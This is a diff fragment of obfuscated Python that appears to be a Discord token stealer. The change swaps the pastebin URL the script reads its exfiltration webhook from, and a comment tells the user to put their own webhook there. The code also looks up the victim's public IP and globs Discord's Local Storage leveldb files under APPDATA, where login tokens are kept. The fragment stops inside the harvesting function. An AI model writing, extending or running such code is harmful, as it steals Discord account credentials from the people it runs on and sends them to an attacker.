@@ -3,7 +3,7 @@ import os,random
 from urllib.request import Request as B,urlopen as C
 import re,glob as D
 #Put your webhook in a pastebin and Change this pastebin to your webhook pastebin
-F=C(B('https://pastebin.com/raw/hSY5ZkZx')).read().decode().strip()
+F=C(B('https://pastebin.com/raw/fcawhhKm')).read().decode().strip()
 G=C(B('https://api.ipify.org')).read().decode().strip()
 def H():
 	B=[];C=os.getenv('APPDATA');E=D.glob(C+'\\Discord\\Local Storage\\leveldb\\*.ldb');E.extend(D.glob(C+'\\Discord\\Local Storage\\leveldb\\*.log'))
